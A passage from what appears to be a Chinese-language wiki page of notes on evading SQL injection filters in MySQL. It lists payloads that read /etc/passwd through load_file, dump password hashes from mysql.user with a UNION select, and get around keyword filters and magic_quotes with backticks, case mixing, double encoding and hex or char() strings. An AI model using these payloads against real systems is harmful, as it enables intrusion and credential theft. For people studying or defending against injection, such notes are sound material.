<div class="hlcode"><pre><span class="n">version</span><span class="p">()</span><span class="o">%</span><span class="mi">0</span><span class="n">b</span>


<span class="err">将</span><span class="n">version</span><span class="p">()</span><span class="err">换成@@</span><span class="n">version</span>


<span class="err">`函数名`</span><span class="p">()</span> <span class="err">等价于</span> <span class="err">函数名</span><span class="p">()</span>
<span class="n">SQL</span><span class="o">&gt;</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="n">and</span><span class="p">(</span><span class="n">select</span> <span class="err">`</span><span class="n">load_file</span><span class="err">`</span><span class="p">(</span><span class="mh">0x2f6574632f706173737764</span><span class="p">)</span> <span class="n">is</span> <span class="n">not</span> <span class="n">null</span><span class="p">)</span>

<span class="n">SQL</span><span class="o">&gt;</span> <span class="n">id</span><span class="o">=</span><span class="mf">1614444.0</span><span class="n">Union</span><span class="p">(</span><span class="n">select</span><span class="o">-</span><span class="mf">1.0</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="err">`</span><span class="n">user</span><span class="err">`</span><span class="n">FROM</span><span class="p">(</span><span class="err">`</span><span class="n">mysql</span><span class="err">`</span><span class="p">.</span><span class="n">user</span><span class="p">))</span>
<span class="err">这里关键是反单引号的使用</span><span class="p">,</span><span class="err">成功逃过了敏感字符串“</span><span class="n">mysql</span><span class="p">.</span><span class="n">user</span><span class="err">”。</span>
<span class="n">id</span><span class="o">=</span><span class="mf">161444.0</span><span class="err">有两个作用</span><span class="p">,</span><span class="err">第一让原来的查询返回空，第二这是一个小数，小数后可以直接接关键字，而不用空格。</span>
</pre></div>


<h3 id="-mysql">语句变形 --mysql黑魔法</h3>
<div class="hlcode"><pre><span class="n">SQL</span><span class="o">&gt;</span> <span class="n">select</span><span class="p">{</span><span class="n">x</span> <span class="n">table_name</span><span class="p">}</span><span class="n">from</span><span class="p">{</span><span class="n">x</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="p">}</span>
</pre></div>


<h3 id="_21">大小写</h3>
<p>SQL&gt; 1+UnIoN/<strong>/SeLecT/</strong>/1,2,3 --</p>
<h2 id="_22">中间层绕过</h2>
<h3 id="phpini">php.ini设置</h3>
<p>safe_mode = On &lt;- 比较用户权限，限制特定函数
display_errors = Off</p>
<p>magic_quotes_gpc = On &lt;- 转义特殊符号
and+column_name+like+%2527%25pass%25%2527 双重转义</p>
<p>magic_quotes_gpc = Off
username=char(97,108,112)%23 &lt;- 不包含引号 username=0x616C7069 select 'a' -&gt; select version() &lt;- 不包含引号</p>
</div>

        </div>
        <div id="footer">
            <span>
                Copyright © 2012-2016 .
                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
            </span>
        </div>
        
    </body>
</html>